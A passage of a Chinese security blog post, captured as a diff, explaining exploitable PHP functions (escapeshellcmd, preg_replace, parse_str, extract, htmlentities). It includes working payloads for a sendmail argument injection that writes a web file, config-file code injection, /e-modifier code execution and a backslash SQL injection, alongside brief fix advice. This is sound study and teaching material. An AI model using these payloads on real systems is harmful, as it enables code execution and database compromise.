+<pre><code>'-fa'\\''\( -OQueueDirectory=/tmp -X/var/www/html/test.php \)@a.com\'
+</code></pre>
+<p>按照刚才上面的分析，我们将payload化简分割一下就是<code>-fa\(</code>、<code>-OQueueDirectory=/tmp</code>、<code>-X/var/www/html/test.php</code>、<code>)@a.com'</code>，这四个部分。最终的参数就是这样被注入的。</p>
+<ul>
+<li><strong>escapeshellarg</strong> ，将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号</li>
+<li><strong>escapeshellcmd</strong> ，会对以下的字符进行转义&amp;#;<code>|*?~&lt;&gt;^()[]{}$</code>, <code>x0A</code> 和 <code>xFF</code>, <code>'</code> 和 <code>&quot;</code>仅在不配对的时候被转义。</li>
+</ul>
+<h3 id="preg_replace">preg_replace</h3>
+<p><a href="http://php.net/manual/zh/function.preg-replace.php"><strong>preg_replace</strong></a>：(PHP 4, PHP 5, PHP 7)</p>
+<blockquote>
+<p><strong>功能</strong> ： 函数执行一个正则表达式的搜索和替换</p>
+<p><strong>定义</strong> ： <code>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</code></p>
+<p>搜索 <strong>subject</strong> 中匹配 <strong>pattern</strong> 的部分， 如果匹配成功将其替换成 <strong>replacement</strong> 。</p>
+</blockquote>
+<p><code>$file = preg_replace(&quot;/[^a-z.-_]/&quot;,&quot;&quot;,$token)</code>此处匹配除了 <strong>a</strong> 字符到 <strong>z</strong> 字符、<strong>.</strong> 字符到 <strong>_</strong> 字符之间的所有字符。</p>
+<p><strong>存在漏洞</strong></p>
+<p><strong>1.逃逸匹配字符，任意文件包含/删除等操作</strong></p>
+<p><strong>2.换行符绕过正则匹配写shell</strong></p>
+<p>经典的配置文件写入问题漏洞.</p>
+<pre><code class="language-php">&lt;?php
+if(!isset($_GET['option'])) die();
+$str = addslashes($_GET['option']);
+$file = file_get_contents('./config.php');
+$file = preg_replace('|\$option=\'.*\';|', &quot;\$option='$str';&quot;, $file);
+file_put_contents('./config.php', $file);
+</code></pre>
+<p><strong>config.php 的内容如下:</strong></p>
+<pre><code class="language-php">&lt;?php
+$option='test';
+</code></pre>
+<p>要求是要getshell,这个场景十分经典，常用在修改配置文件写入的时候。 此处不存在之前说的那个配置文件中用的是&quot;双引号&quot;引起任意代码执行的问题,这里面用的是单引号,而且 addslashes()处理过了,看似很安全,但是对于脑子里有个黑洞的搞安全的人来讲,这个还真是有问题的.</p>
+<p><strong>payload:</strong></p>
+<pre><code class="language-html">http://127.0.0.1/index.php?option=a';%0aphpinfo();//
+http://127.0.0.1/index.php?option=a
+</code></pre>
+<p>执行完第一个之后,config.php中的内容为:</p>
+<pre><code class="language-php">&lt;?php
+$option='a\';
+phpinfo();//';
+</code></pre>
+<p>但是这样并没有办法执行phpinfo(),因为我们插入的 单引号 被转移掉了,所以phpinfo()还是在单引号的包裹之内. 我们在访问下面这个</p>
+<pre><code class="language-url">http://127.0.0.1/index.php?option=a
+</code></pre>
+<p>因为正则 .* 会匹配行内的任意字符无数次.所以 \ 也被认为是其中的一部分,也会被替换掉,执行完之后,config.php中的内容为:</p>
+<pre><code class="language-php">&lt;?php
+$option='a';
+phpinfo();//';
+</code></pre>
+<p><strong>3.preg_replace对<code>\</code>进行转义</strong></p>
+<p>payload如下:</p>
+<pre><code>http://127.0.0.1/index.php?option=a\';phpinfo();//
+</code></pre>
+<p>copy</p>
+<p>config.php变为:(<code>'</code>被转义为<code>\'</code>)</p>
+<pre><code>&lt;?php
+$option='a\\';phpinfo();//';
+</code></pre>
+<p>copy</p>
+<p><strong>4.利用 preg_replace() 函数的第二个参数</strong></p>
+<p>对replacement的描述.</p>
+<blockquote>
+<p>replacement中可以包含后向引用\n 或(php 4.0.4以上可用)$n，语法上首选后者。 每个 这样的引用将被匹配到的第n个捕获子组捕获到的文本替换。 n 可以是0-99，\0和$0代表完整的模式匹配文本。</p>
+</blockquote>
+<p>所以我们可以用:</p>
+<pre><code>http://127.0.0.1/test/ph.php?option=;phpinfo();
+http://127.0.0.1/test/ph.php?option=%00 或者 http://127.0.0.1/test/ph.php?option=$0
+</code></pre>
+<p>执行第一条后config.php的内容为:</p>
+<pre><code>&lt;?php
+$option=';phpinfo();';
+</code></pre>
+<p>再执行第二条后config.php的内容为:</p>
+<pre><code>&lt;?php
+$option='$option=';phpinfo();';';
+</code></pre>
+<p><strong>修复建议</strong></p>
+<p>写全正则pattern</p>
+<h3 id="parse_str">parse_str</h3>
+<p><a href="http://php.net/manual/zh/function.parse-str.php"><strong>parse_str</strong></a></p>
+<blockquote>
+<p><strong>功能</strong> ：parse_str的作用就是解析字符串并且注册成变量，它在注册变量之前不会验证当前变量是否存在，所以会直接覆盖掉当前作用域中原有的变量。</p>
+<p><strong>定义</strong> ：<code>void parse_str( string $encoded_string [, array &amp;$result ] )</code></p>
+<p>如果 <strong>encoded_string</strong> 是 URL 传入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里 ）。</p>
+</blockquote>
+<p><strong>存在漏洞</strong></p>
+<p><strong>1.变量覆盖</strong></p>
+<p>类似<code>b=a[0]=md5('QNKCDZO')</code></p>
+<p><strong>修复建议</strong></p>
+<p>为了解决变量覆盖问题，可以在注册变量前先判断变量是否存在，如果使用 <strong>extract</strong> 函数可以配置第二个参数是 <strong>EXTR_SKIP</strong> 。使用 <strong>parse_str</strong> 函数之前先自行通过代码判断变量是否存在。</p>
+<h3 id="preg_replace-2">preg_replace</h3>
+<blockquote>
+<p><a href="http://php.net/manual/zh/function.preg-replace.php"><strong>preg_replace</strong></a>：(PHP 5.5)</p>
+<p><strong>功能</strong> ： 函数执行一个正则表达式的搜索和替换</p>
+<p><strong>定义</strong> ： <code>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</code></p>
+<p>搜索 <strong>subject</strong> 中匹配 <strong>pattern</strong> 的部分， 如果匹配成功以 <strong>replacement</strong> 进行替换</p>
+</blockquote>
+<ul>
+<li><strong>$pattern</strong> 存在 <strong>/e</strong> 模式修正符，允许代码执行</li>
+<li><strong>/e</strong> 模式修正符，是 <strong>preg_replace()</strong> 将 <strong>$replacement</strong> 当做php代码来执行</li>
+</ul>
+<p><strong>存在漏洞</strong></p>
+<p><strong>1.代码执行</strong></p>
+<pre><code>payload ：value=\S\*=${phpinfo()}
+</code></pre>
+<p><strong>2.不包含字母数字的webshell利用</strong></p>
+<p>https://mp.weixin.qq.com/s/fCxs4hAVpa-sF4tdT_W8-w</p>
+<p><strong>修复建议</strong></p>
+<p>漏洞是 <strong>preg_replace()</strong> 存在 <strong>/e</strong> 模式修正符，如果正则匹配成功，会造成代码执行漏洞，因此为了避免这样的问题，我们避免使用 <strong>/e</strong> 模式修正符，如下图第7行：</p>
+<h3 id="extract">extract</h3>
+<blockquote>
+<p><a href="http://php.net/manual/zh/function.extract.php">extract </a>：(PHP 4, PHP 5, PHP 7)</p>
+<p><strong>功能</strong> ：从数组中将变量导入到当前的符号表</p>
+<p><strong>定义</strong> ： <code>int extract ( array &amp;$array [, int $flags = EXTR_OVERWRITE [, string $prefix = NULL ]] )</code></p>
+</blockquote>
+<p>该函数实际上就是把数组中的键值对注册成变量</p>
+<pre><code>POST
+pi=phpinfo()
+</code></pre>
+<p><strong>修复建议</strong></p>
+<p>实际上，要修复这一类型的漏洞，我们只要在正确的地方退出程序即可。拿这次的例题举例，我们只需要在检查到非法操作的时候，直接添加退出函数，即可避免漏洞发生。例如使用 <strong>die</strong> 、 <strong>exit</strong> 等函数都是可以的。</p>
+<h3 id="htmlentities">htmlentities</h3>
+<blockquote>
+<p><a href="http://php.net/manual/zh/function.htmlentities.php">htmlentities</a> — 将字符转换为 HTML 转义字符</p>
+<pre><code>&gt; string htmlentities ( string $string [, int $flags = ENT_COMPAT | ENT_HTML401 [, string $encoding = ini_get(&quot;default_charset&quot;) [, bool $double_encode = true ]]] )
+&gt;
+</code></pre>
+</blockquote>
+<blockquote>
+<p>作用：在写PHP代码时，不能在字符串中直接写实体字符，PHP提供了一个将HTML特殊字符转换成实体字符的函数 htmlentities()。</p>
+</blockquote>
+<p>注：<strong>htmlentities()</strong> 并不能转换所有的特殊字符，是转换除了空格之外的特殊字符，且单引号和双引号需要单独控制（通过第二个参数）。第2个参数取值有3种，分别如下：</p>
+<ul>
+<li>ENT_COMPAT（默认值）：只转换双引号。</li>
+<li>ENT_QUOTES：两种引号都转换。</li>
+<li>ENT_NOQUOTES：两种引号都不转换。</li>
+</ul>
+<p><code>ENT_NOQUOTES</code>情况下可以使用<code>'</code>进行逃逸，构成xss/sql注入等漏洞</p>
+<p><code>ENT_QUOTES</code>情况下，可以使用<code>\</code>进行过滤，这个例子可以在那些年我们学过的xss一书中看到反斜杠逃逸的例子</p>
+<p>例子：</p>
+<p>正常输入</p>
+<pre><code class="language-sql">username=admin&amp;password=admin
+</code></pre>
+<p>数据库执行语句</p>
+<pre><code class="language-sql">$query='SELECT * FROM ctf.users WHERE name=\''.$username.'\' AND pass=\''.$password.'\';';
+</code></pre>
+<p><strong>username</strong>后面的 <strong>'</strong> 失效，只要这个 <strong>'</strong> 失效，就能闭合**pass=**后面的 <strong>'</strong>。最后组合的payload就如下图所示</p>
+<pre><code class="language-sql">username=\&amp;password=union select * from ctf.users#
+</code></pre>
+<p>数据库执行语句</p>
+<pre><code class="language-sql">$query='SELECT * FROM ctf.users WHERE name=\''.$username.'\' AND pass=\''.$password.'\';';
+</code></pre>
+<p>这里的<code>name=\'' \ \'AND pass='</code></p>
+<p>然后password填入构造的payload即可</p>
+
+							</div>
+	<div class="wow bounceInDown vt-post-tags">
+ 
+					</div>						
+<nav class="navigation3 post-navigation3" role="navigation">
+		
+		<div class="nav-links3">
+      
+		<div class="wow bounceInLeft nav-previous3"><a href="https://loecho.me/QHgcKpkC7/" rel="prev"> PHP反序化漏洞原理利用</a></div>
+		 
+		 
+		<div class="wow bounceInRight nav-next3"><a href="https://loecho.me/L9G2oqFNo/" rel="next"> 关于成长的建议❤️</a></div>
+		
+		</div>
+	</nav>
+	<div class="wow rollIn author-info" style="visibility: visible; animation-name: rollIn;">
+	<div class="author-avatar pull-left"><img src="https://loecho.me/images/avatar.png" ></div>
+ 
+	<div class="author-description"><div class="author-title"><div class="author-link" rel="author">Loecho</div></div>
+
+
+	<p class="author-bio">Red Team@loecho /CTFer@Web /SRC</p></div></div>
+	
+		</div>
+		
+ 
+		
+</article>
+
+<div id="marlin_lite_about_widget-2" class="wow bounceInUp widget marlin_lite_about_widget" data-wow-delay="0.1s">
+		
+        
+		<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src='https://loecho.me/media/scripts/Valine.min.js'></script>
+
+<div class="comment"></div>
+<script>
+        new Valine({
+            // AV 对象来自上面引入av-min.js(老司机们不要开车➳♡゛扎心了老铁)
+            av: AV, 
+            el: '.comment',
+            lang: 'zh-cn',
+            
+            admin_email:'1414596457@qq.com',
+            
+            
+      emoticon_list: ["吐.png","喷血.png","狂汗.png","不说话.png","汗.png","坐等.png","献花.png","不高兴.png","中刀.png","害羞.png","皱眉.png","小眼睛.png","中指.png","尴尬.png","瞅你.png","想一想.png","中枪.png","得意.png","肿包.png","扇耳光.png","亲亲.png","惊喜.png","脸红.png","无所谓.png","便便.png","愤怒.png","蜡烛.png","献黄瓜.png","内伤.png","投降.png","观察.png","看不见.png","击掌.png","抠鼻.png","邪恶.png","看热闹.png","口水.png","抽烟.png","锁眉.png","装大款.png","吐舌.png","无奈.png","长草.png","赞一个.png","呲牙.png","无语.png","阴暗.png","不出所料.png","咽气.png","期待.png","高兴.png","吐血倒地.png","哭泣.png","欢呼.png","黑线.png","喜极而泣.png","喷水.png","深思.png","鼓掌.png","暗地观察.png"],
+     	
+      	
+          
+      placeholder: '欢迎质疑'
+       
+        });
+    </script> 
+
+
+   
+  
+ 
+
+		</div>
+
+			</div>
+			
+
+
+<div class="tocc col l3 hide-on-med-and-down">
+	
+        <div class="toc-widget">
+			
+            <div class="toc-title"></div>
+			
+            <div id="toc-content">
+			
+			
+			</div>
+        </div>
+    </div>
+
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.5.0/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '.entry-summary',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            // headingsOffset: -205,
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('.entry-summary').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+    });
+</script>										 
+
+ 
+       
+
+
+			</div>
+		</div>
+
+		
+		 	<footer id="colophon" class="site-footer">
+
+			<div class="container">
+	
+				<div class="copyright"><a>Red Team@loecho /CTFer@Web /SRC </a><br>Theme:   <a href="https://github.com/shanbufun/gridea-theme-pan" target="_blank" title="Pan"><span>Pan</span></a>.  by <a href="https://shanbu.fun/" target="_blank"  title="山卜方" >Shanbufun</a></div>		
+			</div>
+		
+		</footer>
+
+</div>
+
+<script src="https://cdn.bootcss.com/fitvids/1.2.0/jquery.fitvids.min.js"></script>
+<script type='text/javascript' src='https://loecho.me/media/scripts/marlin-scripts.js'></script>
+ <script src="//tokinx.github.io/lately/lately.min.js"></script>
+  <script>jQuery(document).ready(function(){$.lately({'target':'.lately-a,.lately-b,.lately-c'})});</script>
+  <style type="text/css">a.back_to_top {
+    text-decoration: none;
+    position: fixed;
+    bottom: 40px;
+    right: 30px;
+    background: #f0f0f0;
+    height: 40px;
+    width: 40px;
+    border-radius: 50%;
+    line-height: 36px;
+    font-size: 18px;
+    text-align: center;
+    transition-duration: .5s;
+    transition-propety: background-color;
+    display: none;
+}
+
+a.back_to_top span {
+    color: #888;
+}
+
+a.back_to_top:hover {
+    cursor: pointer;
+    background: #dfdfdf;
+}
+
+a.back_to_top:hover span {
+    color: #555;
+}
+
+@media print, screen and (max-width: 580px) {
+    .back_to_top {
+        display: none !important;
+    }
+}
+
+
+
+</style><a id="back_to_top" href="#" class="back_to_top"><span><i class="iconfont icon-xiangshang"></i></span>
+</a>
+
+
+<script>$(document).ready((function(_this) {
+  return function() {
+    var bt;
+    bt = $('#back_to_top');
+    if ($(document).width() > 480) {
+      $(window).scroll(function() {
+        var st;
+        st = $(window).scrollTop();
+        if (st > 30) {
+          return bt.css('display', 'block');
+        } else {
+          return bt.css('display', 'none');
+        }
+      });
+      return bt.click(function() {
+        $('body,html').animate({
+          scrollTop: 0
+        }, 800);
+        return false;
+      });
+    }
+  };
+})(this));
+</script>
+
+		<script data-no-instant>
+    (function ($) {
+        $.extend({
+            adamsOverload: function () {
+                $('.navigation:eq(0)').remove();
+                $("").attr("rel" , "external");
+                $("a[rel='external'],a[rel='external nofollow']").attr("target","_blank");
+                $("a.vi").attr("rel" , "");
+                $.viewImage({
+                    'target'  : 'img',
+                    'exclude' : '.vsmile-icons img,.gallery img',
+                    'delay'   : 300
+                });
+                $.lately({
+                    'target' : '.commentmetadata a,.infos time,.post-list time'
+                });
+                prettyPrint();
+                
+                $('ul.links li a').each(function(){
+                    if($(this).parent().find('.bg').length==0){
+                        $(this).parent().append('<!---<div class="bg" style="background-image:url(https://c3.glgoo.top/s2/favicons?domain='+$(this).attr("href")+')"></div>--->')
+                    }
+                });
+            }
+        });
+    })(jQuery);
+    jQuery.adamsOverload();
+</script>
+
+</body>
+</html>
